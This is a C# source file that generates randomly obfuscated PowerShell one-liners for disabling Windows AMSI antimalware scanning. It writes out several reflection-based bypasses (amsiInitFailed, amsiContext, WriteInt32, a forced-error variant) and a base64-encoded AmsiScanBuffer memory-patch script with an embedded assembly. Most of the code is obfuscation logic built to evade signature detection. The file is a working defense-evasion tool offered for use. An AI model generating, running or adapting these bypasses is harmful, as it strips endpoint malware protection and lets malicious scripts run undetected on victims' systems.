using System;
using System.Runtime;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;


public class GenerateAMBY
{
    private static Random random = new Random();

    public static int RandomNumber(int min, int max)
    {
        return random.Next(min, max);
    }
    public static string ObfuCharBute(char charin)
    {

        int asciiInt = Convert.ToInt32(charin);
        var asciiByte = Convert.ToByte(asciiInt).ToString("X");
        return "[" + RandomCase("CHAR") + "][" + RandomCase("BYTE") + "]0x" + asciiByte;
    }
    public static string RandomCase(string input)
    {
        return new string((input.Select(x => random.Next() % 2 == 0 ? (char.IsUpper(x) ? x.ToString().ToLower().First() : x.ToString().ToUpper().First()) : x)).ToArray());
    }


    public static string ByteEncode(char inputChar)
    {
        //Get the ascii value of the char
        int asciiValue = Convert.ToInt32(inputChar);
        string randomcaseofByte = RandomCase("byte");
        string asciiValueOfX = Convert.ToByte(asciiValue).ToString("X");

        string output = String.Format("([{0}]0x{1})", randomcaseofByte, asciiValueOfX);  // return $"([{RandomCase("byte")}]0x{Convert.ToByte(asciiValue).ToString("X")})";
        return output;
    }

    public static string DiacriticEncode(string inputChar)
    {
        string charBuilder = "";
        foreach (var _char in inputChar)
        {
            charBuilder += GetRandomDiacritic(Convert.ToInt32(_char));
        }
        return charBuilder;

    }

    private static string GetRandomDiacritic(int asciiValue)
    {
        switch (asciiValue)
        {
            case 65:   //A
                return Convert.ToChar(RandomNumber(192, 197)).ToString();
            case 97:  //a
                return Convert.ToChar(RandomNumber(224, 229)).ToString();
            case 73:  //I
                return Convert.ToChar(RandomNumber(204, 207)).ToString();
            case 105:  //i
                return Convert.ToChar(RandomNumber(236, 239)).ToString();
            case 79:  //O
                return Convert.ToChar(RandomNumber(210, 216)).ToString();
            case 69: //E
                return Convert.ToChar(RandomNumber(236, 239)).ToString();
            case 111: //o
                return Convert.ToChar(RandomNumber(243, 246)).ToString();
            default:
                return Convert.ToChar(asciiValue).ToString();
        }


    }

    public static string HTMLEncode(string inputChar)
    {
        var charBuilder = "";
        foreach (var _char in inputChar)
        {
            charBuilder += String.Format("&#" + Convert.ToInt32(_char) + ";"); // idk why this guy uses interpolated string on here
        }
        return charBuilder;

    }

    public static string CharEncode(char inputChar)
    {
        //Get the ascii value of the char
        int asciiValue = Convert.ToInt32(inputChar);

        //Obfuscate the int value
        return ObfuscateInt(asciiValue).ToString();

    }

    public static string ObfuscateChar(char charInput, string startChar = "+")
    {

        //Select a random encoding method for a single char
        switch (RandomNumber(1, 3))
        {
            case 1:
                return startChar + "[" + RandomCase("CHAR") + "]" + ByteEncode(charInput);
            case 2:
                return startChar + "[" + RandomCase("CHAR") + "]" + CharEncode(charInput);
            default:
                return startChar + "[" + RandomCase("CHAR") + "]" + CharEncode(charInput);
        }

    }

    public static string ObfuscateInt(int asciiInt)
    {
        var subNumber = RandomNumber(asciiInt - asciiInt + 1, (asciiInt - 2));

        switch (RandomNumber(1, 5))
        {
            case 1:
                string output1 = String.Format("({0}+{1})", subNumber, (asciiInt - subNumber));
                return output1;// return $"({subNumber}+{asciiInt - subNumber})";
            case 2:
                string output2 = String.Format("({0}-{1})", (asciiInt + subNumber), subNumber);
                return output2;// return $"({asciiInt + subNumber}-{subNumber})";
            case 3:
                string output3 = String.Format("({0}/{1})", (asciiInt * subNumber), subNumber);
                return output3;// return $"({asciiInt * subNumber}/{subNumber})";
            case 4:
                string output4 = String.Format("({0})", asciiInt);
                return output4;// return $"({asciiInt})";
            default:
                string output5 = String.Format("({0}/{1})", (asciiInt * subNumber), subNumber);
                return output5;// return $"({asciiInt * subNumber}/{subNumber})";
        }
    }

    public static string ObfuscateString(string data, int maxCase = 3)
    {
        string obfuscatedString = "";
        switch (RandomNumber(1, maxCase))
        {
            case 1:
                foreach (char _char in data)
                {
                    obfuscatedString += ObfuscateChar(_char);
                }
                return obfuscatedString;
            case 2:
                string obfuscatedFormD = "";
                string obfuscatedPattern = "";

                foreach (char _char in "FormD")
                {
                    obfuscatedFormD += ObfuscateChar(_char);
                }

                foreach (char _char in @"\p{Mn}")
                {
                    obfuscatedPattern += ObfuscateChar(_char);
                }

                string output6 = String.Format("+'{0}'.", (DiacriticEncode(data)));
                return output6 + RandomCase("Normalize") + "(" + obfuscatedFormD.Remove(0, 1) + ") -replace " + obfuscatedPattern.Remove(0, 1);
            default:
                return "";
        }
    }

    public static string RandomString(int size, bool lowerCase = false)
    {
        var builder = new StringBuilder(size);
        char offset = lowerCase ? 'a' : 'A';
        const int lettersOffset = 26;

        for (var i = 0; i < size; i++)
        {
            var @char = (char)random.Next(offset, offset + lettersOffset);
            builder.Append(@char);
        }
        return lowerCase ? builder.ToString().ToLower() : builder.ToString();
    }

    public static string encodePayload(string examplePayloads, bool doubleQutes = false)
    {
        //Regex to pull out all strings inside '*' tags
        Regex rgStringRule = new Regex(@"\'(.*?)\'", RegexOptions.Compiled | RegexOptions.IgnoreCase);

        //Pull all all results that are not empty
        List<string> matchedStrings = (rgStringRule.Matches(examplePayloads)).Cast<Match>().Where(x => !string.IsNullOrEmpty(x.Value)).Select(x => x.Value).ToList();

        //if there is any results
        if (matchedStrings.Count() > 0)
        {
            //Pick ONE of them at random
            string randomString = matchedStrings[RandomNumber(0, matchedStrings.Count())];

            //Obfuscate the whole string
            string randomObfuscatedString = ObfuscateString(randomString.Replace("'", "")).TrimStart(new[] {'+'});

            //Replace
            examplePayloads = examplePayloads.Replace(randomString, "$(" + randomObfuscatedString + ")");
        }


        //Will add more key words here
        var mustEncodeDict = new Dictionary<string, dynamic>();

        //Find a way for the keywords to determene if their within single or double Q's
        //Re-add htmlencode
        //

        mustEncodeDict.Add("amsiContext", new{ doubleQ = true, maxEnc = 3 });
        mustEncodeDict.Add("amsiSession", new{ doubleQ = true, maxEnc = 3 });
        mustEncodeDict.Add("AmsiUtils", new{ doubleQ = true, maxEnc = 3 });

        mustEncodeDict.Add("amsiInitFailed", new{ doubleQ = false, maxEnc = 3 });

        mustEncodeDict.Add("WriteInt32", new{ doubleQ = true, maxEnc = 3 });
        /*
        var mustEncodeDict = new Dictionary<string, dynamic>(); 
        mustEncodeDict.Add("test1", new{ doubleQ = true, maxEnc = 3 }); 
        Console.WriteLine(mustEncodeDict["test1"].doubleQ);
        */


        foreach (var word in mustEncodeDict)
        {
            string obfuscatedString = ObfuscateString(word.Key, word.Value.maxEnc);

            if (word.Value.doubleQ)
                obfuscatedString = "$(" + obfuscatedString.TrimStart(new[] {'+'}) + ")";
            else
                obfuscatedString = "'+$(" + obfuscatedString.TrimStart(new[] {'+'}) + ")+'";

            examplePayloads = examplePayloads.Replace(word.Key, obfuscatedString);
        }

        return examplePayloads;

    }

    public static string encoderasta(string examplePayloads)
    {
        var mustEncode = new string[] { "AmsiScanBuffer", "amsi.dll" };

        var varsToEncode = new string[] { "LoadLibrary", "GetProcAddress", "VirtualProtect", "CallASBBAPI", "ASBBAPI", "LibLoad", "MemAdr", "Patch", "var1", "var2", "var3", "var4", "var5", "var6" };

        //Maybe relevant later on
        //var patchBytes = new string[] { "B8", "57", "00", "07", "80", "C3" };

        foreach (var word in varsToEncode)
        {
            var neword = RandomString(word.Length);

            examplePayloads = examplePayloads.Replace(word, neword);
        }

        foreach (var word in mustEncode)
        {
            string obfuscatedString = ObfuscateString(word);

            obfuscatedString = "$(" + obfuscatedString.TrimStart(new[] {'+'}) + ")";

            examplePayloads = examplePayloads.Replace(word, obfuscatedString);
        }

        return examplePayloads;

    }
    public static string Generate()
    {
        //Unknown -Force error
        var memVar = RandomString(RandomNumber(3, 10));
        var ForceErrer = "#Unknown - Force error \n$" + memVar + "=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(" + ObfuscateInt(9076) + ");[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\", \"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\", \"NonPublic,Static\").SetValue($null, [IntPtr]$" + memVar + ");";

        // Using Matt Graebers Reflection method
        var MattGRefl = "#Matt Graebers Reflection method \n[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField('amsiInitFailed',\"NonPublic,Static\").SetValue($null,$true);";

        //Using Matt Graebers Reflection method with WMF5 autologging bypass
        var MattGReflLog = "#Matt Graebers Reflection method with WMF5 autologging bypass \n[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\")),('GetField')).Invoke('amsiInitFailed',((\"NonPublic,Static\") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);";

        //Using Matt Graebers second Reflection method
        var MattGref02 = "#Matt Graebers second Reflection method \n[Runtime.InteropServices.Marshal]::(\"WriteInt32\")([Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\",[Reflection.BindingFlags]\"NonPublic,Static\").GetValue($null),0x" + random.Next(0, int.MaxValue).ToString("X") + ");";

        //Using rasta-mouses AmsiScanBufferBypass from https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass.ps1
        var RastaBuf = Encoding.UTF8.GetString(Convert.FromBase64String("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIChkaXNrbGVzcykKJExvYWRMaWJyYXJ5ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiVEc5aFpFeHBZbkpoY25rPSIpKQokR2V0UHJvY0FkZHJlc3MgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJSMlYwVUhKdlkwRmtaSEpsYzNNPSIpKQokVmlydHVhbFByb3RlY3QgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJWbWx5ZEhWaGJGQnliM1JsWTNRPSIpKQokQVNCQkFQSSA9ICJUVnFRQUFNQUFBQUVBQUFBLy84QUFMZ0FBQUFBQUFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWdBQUFBQTRmdWc0QXRBbk5JYmdCVE0waFZHaHBjeUJ3Y205bmNtRnRJR05oYm01dmRDQmlaU0J5ZFc0Z2FXNGdSRTlUSUcxdlpHVXVEUTBLSkFBQUFBQUFBQUJRUlFBQVRBRURBSzhUZ0dBQUFBQUFBQUFBQU9BQUFpRUxBUXNBQUFZQUFBQUdBQUFBQUFBQUhpUUFBQUFnQUFBQVFBQUFBQUFBRUFBZ0FBQUFBZ0FBQkFBQUFBQUFBQUFFQUFBQUFBQUFBQUNBQUFBQUFnQUFBQUFBQUFNQVFJVUFBQkFBQUJBQUFBQUFFQUFBRUFBQUFBQUFBQkFBQUFBQUFBQUFBQUFBQU1RakFBQlhBQUFBQUVBQUFLQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBR0FBQUF3QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBSUFBQUNBQUFBQUFBQUFBQUFBQUFDQ0FBQUVnQUFBQUFBQUFBQUFBQUFDNTBaWGgwQUFBQUpBUUFBQUFnQUFBQUJnQUFBQUlBQUFBQUFBQUFBQUFBQUFBQUFDQUFBR0F1Y25OeVl3QUFBS0FDQUFBQVFBQUFBQVFBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFCQUxuSmxiRzlqQUFBTUFBQUFBR0FBQUFBQ0FBQUFEQUFBQUFBQUFBQUFBQUFBQUFBQVFBQUFRZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFKQUFBQUFBQUFFZ0FBQUFDQUFVQVVDQUFBSFFEQUFBQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFFSlRTa0lCQUFFQUFBQUFBQXdBQUFCMk5DNHdMak13TXpFNUFBQUFBQVVBYkFBQUFFZ0JBQUFqZmdBQXRBRUFBRlFCQUFBalUzUnlhVzVuY3dBQUFBQUlBd0FBQ0FBQUFDTlZVd0FRQXdBQUVBQUFBQ05IVlVsRUFBQUFJQU1BQUZRQUFBQWpRbXh2WWdBQUFBQUFBQUFDQUFBQlJ4VUFGQWtBQUFBQStpVXpBQllBQUFFQUFBQUZBQUFBQWdBQUFBTUFBQUFIQUFBQUJBQUFBQUlBQUFBQkFBQUFBd0FBQUFFQUFBQUJBQUFBQUFBS0FBRUFBQUFBQUFZQUxnQW5BQVlBd1FDaUFBWUE5QURVQUFZQUZBSFVBQVlBTWdHaUFBQUFBQUFCQUFBQUFBQUJBQUVBZ1FFUUFCWUFBQUFGQUFFQUFRQUFBQUFBZ0FDV0lEVUFDZ0FCQUFBQUFBQ0FBSllnUkFBUUFBTUFBQUFBQUlBQWxpQlFBQlVBQkFBQUFBRUFYd0FBQUFJQVp3QUFBQUVBY0FBQUFBRUFkUUFBQUFJQWZ3QUFBQU1BaGdBQ0FBUUFrd0FSQU00QUhnQVpBTTRBSWdBaEFNNEFIZ0FwQU00QUp3QXVBQk1BTEFBdUFCc0FOUUJGQVFBQkF3QTFBQUVBQUFFRkFFUUFBUUFBQVFjQVVBQUJBQVNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQllBQUFBRUFBQUFBQUFBQUFBQUFBQUJBQjRBQUFBQUFBQUFBQUFBUEUxdlpIVnNaVDRBUVZOQ1FrRlFTUzVrYkd3QVFWTkNRa0ZRU1FCdGMyTnZjbXhwWWdCVGVYTjBaVzBBVDJKcVpXTjBBRWRsZEZCeWIyTkJaR1J5WlhOekFFeHZZV1JNYVdKeVlYSjVBRlpwY25SMVlXeFFjbTkwWldOMEFHaE5iMlIxYkdVQWNISnZZMDVoYldVQWJtRnRaUUJzY0VGa1pISmxjM01BWkhkVGFYcGxBR1pzVG1WM1VISnZkR1ZqZEFCc2NHWnNUMnhrVUhKdmRHVmpkQUJUZVhOMFpXMHVVblZ1ZEdsdFpTNUpiblJsY205d1UyVnlkbWxqWlhNQVQzVjBRWFIwY21saWRYUmxBQzVqZEc5eUFGTjVjM1JsYlM1U2RXNTBhVzFsTGtOdmJYQnBiR1Z5VTJWeWRtbGpaWE1BUTI5dGNHbHNZWFJwYjI1U1pXeGhlR0YwYVc5dWMwRjBkSEpwWW5WMFpRQlNkVzUwYVcxbFEyOXRjR0YwYVdKcGJHbDBlVUYwZEhKcFluVjBaUUJFYkd4SmJYQnZjblJCZEhSeWFXSjFkR1VBYTJWeWJtVnNNekl1Wkd4c0FBQUFBQU1nQUFBQUFBQ2d6Y3BROXFlWFJaREd3QmdmRUhROUFBaTNlbHhXR1RUZ2lRVUFBaGdZRGdRQUFSZ09DQUFFQWhnWkNSQUpBeUFBQVFRZ0FRRUlCQ0FCQVE0SUFRQUlBQUFBQUFBZUFRQUJBRlFDRmxkeVlYQk9iMjVGZUdObGNIUnBiMjVVYUhKdmQzTUI3Q01BQUFBQUFBQUFBQUFBRGlRQUFBQWdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBa0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQmZRMjl5Ukd4c1RXRnBiZ0J0YzJOdmNtVmxMbVJzYkFBQUFBQUEveVVBSUFBUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVBRUFBQUFCZ0FBSUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFBUUFBQURBQUFJQUFBQUFBQUFBQUFBQUFBQUFBQUFFQUFBQUFBRWdBQUFCWVFBQUFSQUlBQUFBQUFBQUFBQUFBUkFJMEFBQUFWZ0JUQUY4QVZnQkZBRklBVXdCSkFFOEFUZ0JmQUVrQVRnQkdBRThBQUFBQUFMMEU3LzRBQUFFQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUQ4QUFBQUFBQUFBQkFBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUFCRUFBQUFBUUJXQUdFQWNnQkdBR2tBYkFCbEFFa0FiZ0JtQUc4QUFBQUFBQ1FBQkFBQUFGUUFjZ0JoQUc0QWN3QnNBR0VBZEFCcEFHOEFiZ0FBQUFBQUFBQ3dCS1FCQUFBQkFGTUFkQUJ5QUdrQWJnQm5BRVlBYVFCc0FHVUFTUUJ1QUdZQWJ3QUFBSUFCQUFBQkFEQUFNQUF3QURBQU1BQTBBR0lBTUFBQUFDd0FBZ0FCQUVZQWFRQnNBR1VBUkFCbEFITUFZd0J5QUdrQWNBQjBBR2tBYndCdUFBQUFBQUFnQUFBQU1BQUlBQUVBUmdCcEFHd0FaUUJXQUdVQWNnQnpBR2tBYndCdUFBQUFBQUF3QUM0QU1BQXVBREFBTGdBd0FBQUFPQUFNQUFFQVNRQnVBSFFBWlFCeUFHNEFZUUJzQUU0QVlRQnRBR1VBQUFCQkFGTUFRZ0JDQUVFQVVBQkpBQzRBWkFCc0FHd0FBQUFvQUFJQUFRQk1BR1VBWndCaEFHd0FRd0J2QUhBQWVRQnlBR2tBWndCb0FIUUFBQUFnQUFBQVFBQU1BQUVBVHdCeUFHa0Fad0JwQUc0QVlRQnNBRVlBYVFCc0FHVUFiZ0JoQUcwQVpRQUFBRUVBVXdCQ0FFSUFRUUJRQUVrQUxnQmtBR3dBYkFBQUFEUUFDQUFCQUZBQWNnQnZBR1FBZFFCakFIUUFWZ0JsQUhJQWN3QnBBRzhBYmdBQUFEQUFMZ0F3QUM0QU1BQXVBREFBQUFBNEFBZ0FBUUJCQUhNQWN3QmxBRzBBWWdCc0FIa0FJQUJXQUdVQWNnQnpBR2tBYndCdUFBQUFNQUF1QURBQUxnQXdBQzRBTUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUNBQUFBd0FBQUFnTkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE9IgpbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWQoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRBU0JCQVBJKSkKJENhbGxBU0JCQVBJID0gJiAoW3NjcmlwdGJsb2NrXTo6Q3JlYXRlKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIlcwRlRRa0pCVUVsZCIpKSkpCiRMaWJMb2FkID0gJENhbGxBU0JCQVBJOjokTG9hZExpYnJhcnkoImFtc2kuZGxsIikKJE1lbUFkciA9ICRDYWxsQVNCQkFQSTo6JEdldFByb2NBZGRyZXNzKCRMaWJMb2FkLCAiQW1zaVNjYW5CdWZmZXIiKQokcCA9IDAKJENhbGxBU0JCQVBJOjokVmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQokdmFyMSA9ICIweEI4IgokdmFyMiA9ICIweDU3IgokdmFyMyA9ICIweDAwIgokdmFyNCA9ICIweDA3IgokdmFyNSA9ICIweDgwIgokdmFyNiA9ICIweEMzIgokUGF0Y2ggPSBbQnl0ZVtdXSAoJHZhcjEsJHZhcjIsJHZhcjMsJHZhcjQsKyR2YXI1LCskdmFyNikKW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkUGF0Y2gsIDAsICRNZW1BZHIsIDYp"));

        //Select a random method
        switch (RandomNumber(1, 6))
        {
            case 1:
                return encodePayload(MattGRefl);
            case 2:
                return encodePayload(MattGReflLog);
            case 3:
                return encodePayload(MattGref02);
            case 4:
                return encodePayload(ForceErrer, true);
            case 5:
                return encoderasta(RastaBuf);
            default:
                return encodePayload(MattGRefl);
        }
    }
    public static void Main() { 
        Console.WriteLine(Generate());
    }

}
